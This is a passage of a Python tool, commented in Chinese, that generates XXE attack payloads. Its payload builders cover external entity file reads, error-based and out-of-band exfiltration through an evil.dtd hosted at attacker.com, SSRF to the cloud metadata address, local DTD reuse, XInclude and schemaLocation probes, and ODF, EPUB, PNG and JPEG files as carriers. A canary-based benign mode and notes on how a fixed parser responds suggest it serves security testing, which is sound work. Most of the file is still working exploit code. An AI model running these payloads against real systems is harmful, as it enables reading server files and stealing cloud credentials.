  <office:meta><dc:title>PLACEHOLDER</dc:title></office:meta>
</office:document-meta>"""

    parts: Dict[str, str] = {
        "content.xml": payload if injection == "content" else normal_content,
        "meta.xml": payload if injection == "meta" else normal_meta,
        "styles.xml": ODF_STYLES_XML,
        "settings.xml": ODF_SETTINGS_XML,
    }

    manifest_entries = "\n".join(
        f' <manifest:file-entry manifest:full-path="{n}" manifest:media-type="text/xml"/>'
        for n in sorted(parts)
    )
    manifest = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" '
        'manifest:version="1.2">\n'
        f' <manifest:file-entry manifest:full-path="/" manifest:version="1.2" manifest:media-type="{mime}"/>\n'
        f"{manifest_entries}\n"
        "</manifest:manifest>"
    )

    ensure_dir(os.path.dirname(os.path.abspath(output_path)))
    with zipfile.ZipFile(output_path, "w", zipfile.ZIP_DEFLATED) as zf:
        # ODF 规范：mimetype 必须是第一个条目且不压缩
        zi = zipfile.ZipInfo("mimetype")
        zi.compress_type = zipfile.ZIP_STORED
        zi.external_attr = 0o644 << 16
        zf.writestr(zi, mime)
        zf.writestr("META-INF/manifest.xml", manifest)
        for name in sorted(parts):
            zf.writestr(name, parts[name])


# ----------------------------- EPUB -----------------------------

def create_epub_package(payload: str, output_path: str) -> None:
    container = """<?xml version="1.0" encoding="UTF-8"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>"""

    normal_chapter = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
  <head><title>Chapter 1</title></head>
  <body><h1>Chapter 1</h1><p>PLACEHOLDER</p></body>
</html>"""

    normal_nav = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Nav</title></head>
  <body>
    <nav epub:type="toc"><ol><li><a href="chapter1.xhtml">Chapter 1</a></li></ol></nav>
  </body>
</html>"""

    ensure_dir(os.path.dirname(os.path.abspath(output_path)))
    with zipfile.ZipFile(output_path, "w", zipfile.ZIP_DEFLATED) as zf:
        zi = zipfile.ZipInfo("mimetype")
        zi.compress_type = zipfile.ZIP_STORED
        zi.external_attr = 0o644 << 16
        zf.writestr(zi, "application/epub+zip")
        zf.writestr("META-INF/container.xml", container)
        zf.writestr("OEBPS/content.opf", payload)
        zf.writestr("OEBPS/chapter1.xhtml", normal_chapter)
        zf.writestr("OEBPS/nav.xhtml", normal_nav)


# ============================================================================
# 第四部分：图片二进制载体（[P1-6] JPEG 修复）
# ============================================================================

# [v2.3][P1] XMP 载体重构：
# v2.2 把完整 payload 文档（含 <!DOCTYPE rdf:RDF [...]>）注入到
# <rdf:Description> 元素内部，而 XML 规范要求 DOCTYPE 只能出现在根元素
# 之前 —— 产出的 XMP 包必然非良构，任何严格解析器直接 fatal error，
# 4 个 XMP 探针从未生效。这里把 DOCTYPE 提升到包级别（<?xpacket?> PI
# 之后、<x:xmpmeta> 根元素之前），实体声明进内部子集，实体引用留在
# <rdf:Description> 里，整包恢复良构。
XMP_PACKET_TEMPLATE = """<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>
<!DOCTYPE x:xmpmeta [
__ENTITIES__
]>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
    <rdf:Description xmlns:dc="http://purl.org/dc/elements/1.1/" rdf:about="">
__BODY__
    </rdf:Description>
  </rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>"""


def build_xmp_packet(entities: str, body: str) -> str:
    """[v2.3][P1] 组装完整 XMP 包：DOCTYPE 在根元素前，实体引用在 body。"""
    return (XMP_PACKET_TEMPLATE
            .replace("__ENTITIES__", entities.strip("\n"))
            .replace("__BODY__", body))

# FFD8 + FFE0 + 0010 + 16 bytes JFIF payload = 20 bytes
JFIF_SEGMENT_LEN = 20

MINIMAL_JPEG = bytes.fromhex(
    "ffd8"
    "ffe000104a46494600010100000100010000"
    "ffdb004300"
    "0302020302020303030304030304050805050404050a07070608"
    "0c0a0c0c0b0a0b0b0d0e12100d0e110e0b0b1016101113141515150c0f171816141812141514"
    "ffc0000b080001000101011100"
    "ffc40014000100000000000000000000000000000008"
    "ffc40014100000000000000000000000000000000000"
    "ffda0008010100003f00"
    "d2cf20"
    "ffd9"
)


def _chunk(chunk_type: bytes, data: bytes) -> bytes:
    return (struct.pack(">I", len(data)) + chunk_type + data
            + struct.pack(">I", zlib.crc32(chunk_type + data) & 0xFFFFFFFF))


def make_png_with_xmp(xmp_packet: str, output_path: str) -> None:
    # [v2.3][P1] 入参改为完整 XMP 包（含包级 DOCTYPE），不再套模板
    signature = b"\x89PNG\r\n\x1a\n"
    ihdr = _chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
    # XMP-in-PNG 规范要求 5 个 null 分隔符：
    #   keyword \0 compression_flag \0 compression_method \0 lang \0 transkey \0
    # v2.1 只写了 3 个，严格解析器会把 text 的前两字节误当本地化字段
    itxt = _chunk(b"iTXt", b"XML:com.adobe.xmp\x00\x00\x00\x00\x00"
                 + xmp_packet.encode("utf-8"))
    idat = _chunk(b"IDAT", zlib.compress(b"\x00\x00\x00\x00"))
    iend = _chunk(b"IEND", b"")
    ensure_dir(os.path.dirname(os.path.abspath(output_path)))
    with open(output_path, "wb") as f:
        f.write(signature + ihdr + itxt + idat + iend)


def make_jpeg_with_xmp(xmp_packet: str, output_path: str) -> None:
    """
    [P1-6] v2.0 把 APP1(XMP) 直接插在 SOI 之后，导致标记序列变成
        SOI -> APP1 -> APP0(JFIF)
    JFIF 规范要求 APP0 紧跟 SOI，Adobe XMP 规范也要求 XMP 段位于 JFIF 之后。
    这里把 APP1 插到第 20 字节（即 JFIF 段之后）。
    """
    app1_payload = b"http://ns.adobe.com/xap/1.0/\x00" + xmp_packet.encode("utf-8")
    if len(app1_payload) + 2 > 0xFFFF:
        raise ValueError(
            f"XMP 载荷过长（{len(app1_payload)} 字节），"
            f"JPEG APP1 段上限为 65533 字节")
    app1 = struct.pack(">HH", 0xFFE1, len(app1_payload) + 2) + app1_payload

    jpeg = (MINIMAL_JPEG[:JFIF_SEGMENT_LEN]
            + app1
            + MINIMAL_JPEG[JFIF_SEGMENT_LEN:])

    ensure_dir(os.path.dirname(os.path.abspath(output_path)))
    with open(output_path, "wb") as f:
        f.write(jpeg)


def create_binary_carrier(carrier: str, payload: str, output_path: str) -> None:
    if carrier == "jpg":
        make_jpeg_with_xmp(payload, output_path)
    elif carrier == "png":
        make_png_with_xmp(payload, output_path)
    else:
        raise ValueError(f"不支持的图片载体: {carrier}")


# ============================================================================
# 第五部分：核心 Payload 生成器
# ============================================================================

class XXEPayloadGenerator:
    def __init__(self, target_file: str = "/etc/hostname",
                 attacker_url: str = "http://attacker.com",
                 ssrf_url: str = "http://169.254.169.254/latest/meta-data/",
                 target_os: str = "linux",
                 platform: str = "java",
                 benign: bool = False,
                 oob_mode: str = "plain",
                 dtd_db: Optional[List[Dict]] = None):
        self.target_file = target_file
        self.attacker_url = attacker_url.rstrip("/")
        self.ssrf_url = ssrf_url
        self.target_os = target_os
        self.platform = platform
        self.benign = benign
        self.oob_mode = oob_mode
        self.dtd_db = dtd_db if dtd_db is not None else LOCAL_DTD_DATABASE
        self.run_id = uuid.uuid4().hex[:8]
        self.attacker_host = extract_host(attacker_url)
        self.attacker_netloc = extract_netloc(attacker_url)
        self.base_url = self.attacker_url
        # [A3] canary 投递模式：attacker 是 IP 字面量时改走路径形态
        self.canary_mode = "path" if is_ip_literal(self.attacker_host) else "dns"
        # [A4] label -> payload 元信息，落盘为 canary_map.json
        self.canary_map: Dict[str, Dict[str, str]] = {}

    # ---------------- 无害化 / canary ----------------

    def _slug(self, name: str) -> str:
        """
        [A4] 由 payload 名派生 6 位短哈希。

        v2.1 只用 15 个粗粒度 tag，导致 42 个 canary 标签里 25 个撞车
        （localdtd-file-* 被 9 个产物共用，xinc-file-* 被 3 个共用），
        回调响了你只知道"某一类通了"，不知道是哪个文件、哪个注入点。
        """
        return hashlib.sha1(
            f"{self.run_id}:{name}".encode("utf-8")).hexdigest()[:6]

    def _canary(self, cat: str, name: str, kind: str) -> str:
        """构造并登记一个全局唯一的 canary URL。"""
        label = f"{cat}-{kind}-{self._slug(name)}-{self.run_id}"
        self.canary_map[label] = {
            "category": cat,
            "payload": name,
            "kind": kind,
            "run_id": self.run_id,
            "mode": self.canary_mode,
        }
        if self.canary_mode == "path":
            # [A3] attacker 是 IP 时子域名不可解析，改走路径形态
            return f"http://{self.attacker_netloc}/c/{label}"
        # 用 netloc 而非 host，否则 -a http://x:8080 的端口会被吃掉
        return f"http://{label}.{self.attacker_netloc}"

    def _css_uri(self, cat: str, name: str) -> str:
        """
        CSS @import 场景的 URI。

        v2.1 把 ssrf_url 原样拼进 <style> 文本节点，URL 含 & 时产出的是
        非良构 XML（实测 -s 'http://x/?a=1&b=2' 时报 not well-formed）。
        这里统一转义，并用单引号包裹以容忍 URL 中的括号。
        """
        target = (self._canary(cat, name, "ssrf") if self.benign
                  else self.ssrf_url)
        return escape(target or "", {'"': "&quot;", "'": "&apos;"})

    def _probe_local_file(self) -> str:
        """指纹探针用的无害本地文件：Windows 上没有 /dev/null。"""
        if self.target_os == "windows":
            return "file:///C:/Windows/System32/drivers/etc/hosts"
        return "file:///dev/null"

    def _read_uri(self, tag: str, name: str = "") -> str:
        """benign 模式下把 file:// 目标替换为唯一 canary。"""
        if self.benign:
            return self._canary(tag, name or tag, "file")
        return self._file_uri()

    def _ssrf_uri(self, tag: str, name: str = "") -> str:
        if self.benign:
            return self._canary(tag, name or tag, "ssrf")
        return self.ssrf_url

    def _file_uri(self) -> str:
        return normalize_file_uri(self.target_file)

    def _dtd_url(self, name: str = "evil.dtd") -> str:
        return f"{self.base_url}/{name}"

    def _oob_dtd_url(self) -> str:
        """[P1-9] 通过 ?enc= 选择外带编码模式。"""
        return f"{self.base_url}/oob.dtd?enc={self.oob_mode}"

    def _error_path_prefix(self) -> str:
        """[P1-10] Windows 目标需要盘符前缀才会触发预期的 IO 错误。"""
        if self.target_os == "windows":
            return "file:///C:/nonexistent_xxe_error/"
        return "file:///nonexistent_xxe_error/"

    def _generate_evil_dtd(self) -> str:
        """
        [v2.3][P1] v2.2 在 benign 模式直接用 _file_uri()，绕过了无害化检查，
        落盘的 *_evil.dtd 仍指向真实 --target-file —— payload 替换成了 canary、
        DTD 却读真文件，--probe / verify_fix 的"无害"承诺名存实亡。
        改为统一走 _read_uri()。
        """
        file_uri = self._read_uri("error", "error_based_external_dtd")
        return (
            f"<!ENTITY % file SYSTEM {xml_attr(file_uri)}>\n"
            "<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM "
            f"'{self._error_path_prefix()}%file;'>\">\n"
            "%eval;\n"
            "%error;\n"
        )

    # ---------------- 基础场景 ----------------

    def generate_basic_file_entity_payload(self) -> Dict:
        file_uri = self._read_uri("basic", "basic_file_entity")
        payload = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            "<!DOCTYPE root [\n"
            f"  <!ENTITY xxe SYSTEM {xml_attr(file_uri)}>\n"
            "]>\n"
            "<root>&xxe;</root>"
        )
        return {
            "name": "basic_file_entity",
            "technique": "基础外部实体文件读取",
            "description": "最基础的 XXE 文件读取模板",
            "payload": payload,
            "file_ext": ".xml",
            "content_type": "application/xml",
            "injection_point": "直接提交 XML 的接口",
            "target_component": ["任意 XML 解析入口"],
            "benign": self.benign,
            "interpretation": {
                "文件内容回显到 <root>": "存在 XXE，且解析器允许外部实体 + 应用回显实体内容",
                "报错提及外部实体被禁止": "解析器已加固（disallow-doctype-decl / FEATURE_SECURE_PROCESSING）",
                "无任何输出": "可能是 Blind XXE，转用 blind_ssrf 或 error_based 模式",
            },
            "expected_when_fixed": "实体不被解析，回显为空或报错",
            "expected_when_vulnerable": "目标文件内容出现在响应中",
            "requirements": ["解析器允许 DOCTYPE / 外部实体", "应用回显被解析的节点内容"],
        }

    def generate_local_dtd_payload(self) -> List[Dict]:
        """[P2-5] 平台过滤为空时回落到 cross-platform 素材，避免返回空列表。"""
        matched = [d for d in self.dtd_db
                   if self.platform in d.get("platforms", [])
                   and self.target_os in d.get("systems", [])]
        if not matched:
            matched = [d for d in self.dtd_db if d.get("cross")]
        if not matched:
            matched = list(self.dtd_db)

        results = []
        for d in matched:
            pname = f"local_dtd_reuse_{d['entity']}::{d['path']}"
            file_uri = self._read_uri("localdtd", pname)
            # Local DTD Reuse 的正确姿势：
            #   1. 在内部子集里用本地 DTD 中「真实存在」的参数实体名（d['entity']）
            #      定义一个覆盖值，本地 DTD 稍后引用它时就会展开我们的 Payload。
            #   2. Payload 内部不能出现字面量 '%'，否则在内部子集里非法，
            #      所以用 &#x25; 代替；再往下一层则需要 &#x26;#x25;（即 &#x25; 的字面文本）。
            #   3. 最后用 %local_dtd; 加载本地 DTD 触发整条链。
            payload = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE root [\n"
                f'  <!ENTITY % local_dtd SYSTEM '
                f'{xml_attr_dq(dtd_system_uri(d["path"]))}>\n'
                f'  <!ENTITY % {d["entity"]} \'\n'
                f'    <!ENTITY &#x25; file SYSTEM {xml_attr_dq(file_uri)}>\n'
                f'    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM '
                f"&#x27;{self._error_path_prefix()}&#x25;file;&#x27;>\">\n"
                "    &#x25;eval;\n"
                "    &#x25;error;\n"
                "  '>\n"
                "  %local_dtd;\n"
                "]>\n"
                "<root>XXE Local DTD Reuse</root>"
            )
            results.append({
                "name": f"local_dtd_reuse_{d['entity']}",
                "technique": "Local DTD Reuse",
                "description": (
                    f"复用目标主机本地 DTD（{d['system']}），"
                    f"重定义其内部参数实体实现出网受限环境下的文件读取"
                ),
                "payload": payload,
                "file_ext": ".xml",
                "content_type": "application/xml",
                "injection_point": "XML 请求体",
                "target_component": [d["system"]],
                "dtd_path": d["path"],
                "benign": self.benign,
                "interpretation": {
                    "报错中出现目标文件内容": "Local DTD Reuse 成功，文件已通过错误信息外带",
                    "报错为 'Cannot find the declaration of element'": "本地 DTD 路径不存在，换素材重试",
                    "报错为外部实体被禁止": "解析器已加固",
                },
                "expected_when_fixed": "参数实体重定义被拒绝",
                "expected_when_vulnerable": "错误信息中泄露文件内容",
                "requirements": [
                    f"目标主机存在 {d['path']}",
                    "解析器允许外部 DTD 加载（出网受限时走本地文件）",
                    "错误信息会回显到响应",
                ],
                "note": d.get("note", ""),
            })
        return results

    def generate_error_based_payload(self) -> Dict:
        file_uri = self._read_uri("errdtd", "error_based_external_dtd")
        dtd_url = self._dtd_url("evil.dtd")
        # [A1] v2.1 致命缺陷：声明了 %ext 却从不引用，外部 DTD 永不加载，
        #      Error-Based 整条链断在第二步，而判读文案还会把"零回连"
        #      解释成"外部 DTD 加载被禁用" —— 失效被误判成已加固。
        #      这里补上 %ext; 引用。
        payload = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            "<!DOCTYPE root [\n"
            f"  <!ENTITY % ext SYSTEM {xml_attr(dtd_url)}>\n"
            f"  <!ENTITY xxe SYSTEM {xml_attr(file_uri)}>\n"
            "  %ext;\n"
            "]>\n"
            "<root>&xxe;</root>"
        )
        return {
            "name": "error_based_external_dtd",
            "technique": "Error-Based XXE",
            "description": "通过远程 evil.dtd 制造 IO 错误，把文件内容塞进错误信息外带",
            "payload": payload,
            "evil_dtd": self._generate_evil_dtd(),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "injection_point": "XML 请求体",
            "target_component": ["Blind 场景但不回显实体内容时"],
            "benign": self.benign,
            "interpretation": {
                "错误信息中出现文件内容": "存在 XXE 且错误信息回显",
                "只有文件不存在的报错": "外部 DTD 被加载，但目标文件不存在",
                "完全没有回连": "外部 DTD 加载被禁用（XMLConstants.ACCESS_EXTERNAL_DTD=\"\"）",
            },
            "expected_when_fixed": "无 DTD 请求，响应中不含文件内容",
            "expected_when_vulnerable": "错误信息包含目标文件内容",
            "requirements": ["允许外部 DTD", "错误信息会回显到客户端"],
        }

    def generate_blind_ssrf_payload(self) -> List[Dict]:
        """
        [A4] 五个探针各自持有独立 canary 标签。

        v2.1 里 param_entity / general_entity / doctype_system 共用同一个
        ssrf_url，回调响了只能知道"某一类通了"，区分不出是哪条通道。
        另外修正命名：v2.1 的 "general_entity" 实际用的是参数实体 %ssrf;，
        这里拆成"参数实体直连"与真正的"通用实体"两个探针。

        [v2.3][P3] 删除两处死代码：
          - file_uri = self._read_uri(...) 从未被本探针引用，
            只会在 canary_map 里登记一个永远打不响的孤儿标签；
          - "evil_dtd": self._generate_oob_dtd() 落盘的 *_evil.dtd
            是"重定向到 /oob.dtd"的中间层，但 payload 的 %ext 直接指向
            服务端 /oob.dtd，没有任何产物引用该文件，纯属误导。
        """
        dtd_url = self._dtd_url("oob.dtd")

        param_entity = {
            "name": "blind_ssrf_parameter_entity",
            "technique": "Blind SSRF - 参数实体外带",
            "description": "通过外部 DTD 中的参数实体把文件内容带外到攻击者服务器",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE root [\n"
                f"  <!ENTITY % ext SYSTEM {xml_attr(dtd_url)}>\n"
                "%ext;\n"
                "]>\n"
                "<root>blind</root>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "target_component": ["Blind XXE，无任何回显"],
            "injection_point": "XML 请求体",
            "benign": self.benign,
            "interpretation": {
                "服务器收到 /oob.dtd 请求": "外部 DTD 被加载，XXE 成立",
                "随后收到带数据的请求": "文件内容成功外带",
                "完全无请求": "外部 DTD 被禁用",
            },
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "先请求 DTD，再带数据回连",
            "requirements": ["允许外部 DTD", "目标可出网"],
        }

        param_direct = {
            "name": "blind_ssrf_param_entity_direct",
            "technique": "Blind SSRF - 参数实体直连（不依赖外部 DTD）",
            "description": "在内部子集直接用参数实体触发 SSRF 请求",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE root [\n"
                f"  <!ENTITY % ssrf SYSTEM "
                f"{xml_attr(self._ssrf_uri('blind', 'blind_ssrf_param_entity_direct'))}>\n"
                "%ssrf;\n"
                "]>\n"
                "<root>ssrf</root>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "injection_point": "XML 请求体",
            "target_component": ["Blind XXE，外部 DTD 被禁但参数实体可用"],
            "benign": self.benign,
            "interpretation": {
                "收到 SSRF 请求": "参数实体 + 外部实体可用",
                "无请求": "参数实体被禁用",
            },
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "收到 SSRF 请求",
            "requirements": ["解析器允许参数实体引用外部资源"],
        }

        general_entity = {
            "name": "blind_ssrf_general_entity",
            "technique": "Blind SSRF - 通用实体探测",
            "description": (
                "真正用通用实体 &ssrf; 触发 SSRF。"
                "（v2.1 同名探针实际用的是参数实体，这里修正）"
            ),
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE root [\n"
                f"  <!ENTITY ssrf SYSTEM "
                f"{xml_attr(self._ssrf_uri('blind', 'blind_ssrf_general_entity'))}>\n"
                "]>\n"
                "<root>&ssrf;</root>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "injection_point": "XML 请求体",
            "target_component": ["仅允许通用实体、禁用参数实体的环境"],
            "benign": self.benign,
            "interpretation": {
                "收到 SSRF 请求": "通用实体 + 外部实体可用",
                "无请求": "通用实体被禁用",
            },
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "收到 SSRF 请求",
            "requirements": ["解析器允许外部通用实体"],
        }

        doctype_system = {
            "name": "blind_ssrf_doctype_system",
            "technique": "Blind SSRF - DOCTYPE SYSTEM",
            "description": "把 DOCTYPE 的 SYSTEM 标识符直接指向 SSRF 目标",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                f"<!DOCTYPE root SYSTEM "
                f"{xml_attr(self._ssrf_uri('blind', 'blind_ssrf_doctype_system'))}>\n"
                "<root>doctype_ssrf</root>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "target_component": ["连实体都被禁，但 DOCTYPE SYSTEM 仍解析的极端场景"],
            "benign": self.benign,
            "interpretation": {
                "收到请求": "DOCTYPE 外部子集被解析",
                "无请求": "DOCTYPE 处理被完全禁用",
            },
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "收到 SSRF 请求",
            "requirements": ["DOCTYPE 外部子集解析未被禁用"],
        }

        dns_canary = {
            "name": "blind_ssrf_dns_canary",
            "technique": "Blind SSRF - DNS Canary",
            "description": "最轻量的探测：只触发一次 DNS 解析，不读取任何文件",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE root [\n"
                f"  <!ENTITY % dns SYSTEM "
                f"{xml_attr(self._canary('blind', 'blind_ssrf_dns_canary', 'dns'))}>\n"
                "%dns;\n"
                "]>\n"
                "<root>dns</root>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "target_component": ["出网受限但 DNS 可解析的环境"],
            "benign": True,
            "interpretation": {
                "收到 DNS 查询": "实体解析 + 外部请求均可用",
                "无 DNS 查询": "实体或外部请求被禁",
            },
            "expected_when_fixed": "零 DNS 查询",
            "expected_when_vulnerable": "收到唯一 canary 子域名的 DNS 查询",
            "requirements": (
                ["目标可发起 DNS 查询"]
                + (["注意: attacker 为 IP 字面量，本探针已退化为 HTTP canary，"
                    "纯 DNS 外带需自行准备 DNS 泛解析或 DNSLog 服务"]
                   if self.canary_mode == "path"
                   else ["需要 DNS 泛解析或 DNSLog 服务才能观测"])
            ),
        }
        return [param_entity, param_direct, general_entity,
                doctype_system, dns_canary]

    def generate_xinclude_payload(self) -> List[Dict]:
        XI_NS = "http://www.w3.org/2001/XInclude"

        file_read = {
            "name": "xinclude_file_read",
            "technique": "XInclude 文件读取",
            "description": "无需 DOCTYPE，用 XInclude 读取本地文件",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<root xmlns:xi="{XI_NS}">\n'
                f'  <xi:include parse="text" '
                f'href={xml_attr(self._read_uri("xinc", "xinclude_file_read"))}/>\n'
                "</root>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "injection_point": "XML 请求体",
            "target_component": ["禁用了 DOCTYPE 但启用了 XInclude 的解析器"],
            "benign": self.benign,
            "interpretation": {
                "内容被内联": "XInclude 可用且应用回显",
                "报错 'XInclude is not supported'": "已加固",
            },
            "expected_when_fixed": "内容不被内联",
            "expected_when_vulnerable": "文件内容被内联进响应",
            "requirements": ["解析器启用 XInclude"],
        }

        ssrf = {
            "name": "xinclude_ssrf",
            "technique": "XInclude SSRF",
            "description": "XInclude 触发服务端请求",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<root xmlns:xi="{XI_NS}">\n'
                f'  <xi:include parse="text" '
                f'href={xml_attr(self._ssrf_uri("xinc", "xinclude_ssrf"))}/>\n'
                "</root>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "target_component": ["同上，SSRF 版"],
            "benign": self.benign,
            "interpretation": {
                "收到请求": "XInclude SSRF 成立",
                "无请求": "XInclude 被禁用",
            },
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "收到 SSRF 请求",
            "requirements": ["解析器启用 XInclude"],
        }

        fallback = {
            "name": "xinclude_with_fallback",
            "technique": "XInclude + xi:fallback",
            "description": "部分解析器在 include 失败时会渲染 fallback，可用于布尔判定",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<root xmlns:xi="{XI_NS}">\n'
                f'  <xi:include parse="text" '
                f'href={xml_attr(self._read_uri("xinc", "xinclude_with_fallback"))}>\n'
                "    <xi:fallback>FILE_NOT_FOUND</xi:fallback>\n"
                "  </xi:include>\n"
                "</root>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "target_component": ["支持 XInclude fallback 的解析器（Xerces / libxml2）"],
            "benign": self.benign,
            "interpretation": {
                "出现 FILE_NOT_FOUND": "XInclude 被解析，但目标文件不存在",
                "出现文件内容": "读取成功",
                "两者都没有": "XInclude 未被处理",
            },
            "expected_when_fixed": "两者都不出现",
            "expected_when_vulnerable": "出现文件内容或 FILE_NOT_FOUND",
            "requirements": ["解析器支持 xi:fallback"],
        }

        xml_parse = {
            "name": "xinclude_xml_parse",
            "technique": "XInclude parse=xml",
            "description": "以 XML 方式包含，可读结构化的 XML 配置文件",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<root xmlns:xi="{XI_NS}">\n'
                f'  <xi:include parse="xml" '
                f'href={xml_attr(self._read_uri("xinc", "xinclude_xml_parse"))}/>\n'
                "</root>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "target_component": ["目标文件本身是合法 XML 时（如 web.xml）"],
            "benign": self.benign,
            "interpretation": {
                "XML 片段被内联": "成功",
                "XML 解析错误": "目标文件不是合法 XML，改用 parse=text",
            },
            "expected_when_fixed": "不被内联",
            "expected_when_vulnerable": "XML 片段被内联",
            "requirements": ["目标文件是合法 XML"],
        }
        return [file_read, ssrf, fallback, xml_parse]

    def generate_schema_ssrf_payload(self) -> List[Dict]:
        XSI_NS = "http://www.w3.org/2001/XMLSchema-instance"

        no_ns = {
            "name": "schema_ssrf_no_namespace",
            "technique": "xsi:noNamespaceSchemaLocation SSRF",
            "description": "通过 schemaLocation 让解析器请求外部 XSD",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<root xmlns:xsi="{XSI_NS}" '
                f'xsi:noNamespaceSchemaLocation='
                f'{xml_attr(self._ssrf_uri("schema", "schema_ssrf_no_namespace"))}>\n'
                "  <data>test</data>\n"
                "</root>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "injection_point": "XML 请求体",
            "target_component": ["启用了 Schema 校验的解析器"],
            "benign": self.benign,
            "interpretation": {
                "收到 XSD 请求": "Schema 外部引用可用，构成 SSRF",
                "无请求": "Schema 校验或外部 Schema 被禁用",
            },
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "收到 XSD 请求",
            "requirements": ["启用 Schema 校验", "允许远程 XSD"],
        }

        with_ns = {
            "name": "schema_ssrf_with_namespace",
            "technique": "xsi:schemaLocation SSRF",
            "description": "带命名空间的 schemaLocation 形式，兼容性更广",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<root xmlns:xsi="{XSI_NS}" xmlns:t="urn:test" '
                f'xsi:schemaLocation='
                f'{xml_attr("urn:test " + self._ssrf_uri("schema", "schema_ssrf_with_namespace"))}>\n'
                "  <t:data>test</t:data>\n"
                "</root>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "target_component": ["同上"],
            "benign": self.benign,
            "interpretation": {
                "收到 XSD 请求": "SSRF 成立",
                "无请求": "被禁用",
            },
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "收到 XSD 请求",
            "requirements": ["启用 Schema 校验", "允许远程 XSD"],
        }

        xsd_include = {
            "name": "schema_ssrf_xsd_include",
            "technique": "XSD 内 xs:include / xs:import SSRF",
            "description": "比 schemaLocation 更深一层：XSD 内部的外部引用",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">\n'
                f'  <xs:include schemaLocation='
                f'{xml_attr(self._ssrf_uri("schema", "schema_ssrf_xsd_include"))}/>\n'
                f'  <xs:import namespace="urn:x" schemaLocation='
                f'{xml_attr(self._ssrf_uri("schema", "schema_ssrf_xsd_include"))}/>\n'
                f'  <xs:element name="root" type="xs:string"/>\n'
                "</xs:schema>"
            ),
            "file_ext": ".xsd",
            "content_type": "application/xml",
            "target_component": ["接受 .xsd 上传 / 指定的 Schema 校验服务"],
            "benign": self.benign,
            "interpretation": {
                "收到 include/import 请求": "XSD 层 SSRF 成立",
                "无请求": "被禁用",
            },
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "收到请求",
            "requirements": ["服务会解析并加载 XSD 的外部引用"],
        }

        dtd_import = {
            "name": "schema_ssrf_doctype_import",
            "technique": "DOCTYPE + 外部实体混合",
            "description": "DOCTYPE 与 schemaLocation 双通道，任一可用即命中",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE root [\n"
                f"  <!ENTITY % ext SYSTEM "
                f"{xml_attr(self._ssrf_uri('schema', 'schema_ssrf_doctype_import'))}>\n"
                "%ext;\n"
                "]>\n"
                f'<root xmlns:xsi="{XSI_NS}" '
                f'xsi:noNamespaceSchemaLocation='
                f'{xml_attr(self._ssrf_uri("schema", "schema_ssrf_doctype_import"))}>'
                f'test</root>'
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "target_component": ["不确定哪条通道可用时的组合探测"],
            "benign": self.benign,
            "interpretation": {
                "收到两次请求": "两条通道都通",
                "收到一次请求": "仅一条通",
                "零请求": "都已加固",
            },
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "至少一次回连",
            "requirements": [],
        }
        return [no_ns, with_ns, xsd_include, dtd_import]

    # ---------------- 业务场景 ----------------

    def generate_soap_payloads(self) -> List[Dict]:
        XI_NS = "http://www.w3.org/2001/XInclude"
